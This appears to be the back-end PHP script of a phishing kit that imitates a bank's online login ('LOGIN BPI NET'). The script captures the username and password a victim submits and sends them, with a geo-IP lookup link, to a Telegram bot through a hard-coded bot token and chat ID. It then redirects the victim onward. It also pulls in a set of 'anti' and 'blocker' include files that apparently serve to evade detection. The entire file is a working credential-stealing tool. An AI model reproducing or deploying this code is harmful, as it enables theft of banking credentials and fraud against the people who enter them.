<?php 
include "./boots/anti1.php";
include "./boots/anti2.php";
include "./boots/anti3.php";
include "./boots/anti4.php";
include "./boots/anti5.php";
include "./boots/anti6.php";
include "./boots/anti7.php";
include "./boots/anti8.php";
include "./boots/anti9.php";
include "./boots/anti10.php";
include "./boots/anti11.php";
include "./boots/anti12.php";
include "./boots/anti13.php";
include "./boots/anti14.php";
include "./boots/anti15.php";
include "./boots/anti16.php";
include "./boots/blocker.php";
?>
<?php
$ip = getenv("REMOTE_ADDR");

{
$hostname = gethostbyaddr($ip);
$ip = getenv("REMOTE_ADDR");
$message .= "--------------[LOGIN BPI NET]----------------\n";

$message .= "* LOGIN : ".$_POST['username']."\n";
$message .= "* Password : ".$_POST['password']."\n";


$message .= "+-------------------------------+\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "+----------------------------+\n";

$token ='6210776666:AAHJHiZDA';
$data = [
    'text' => $message,
    'chat_id' => '-945615568',
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

}


header("Location: ./load.php");

?>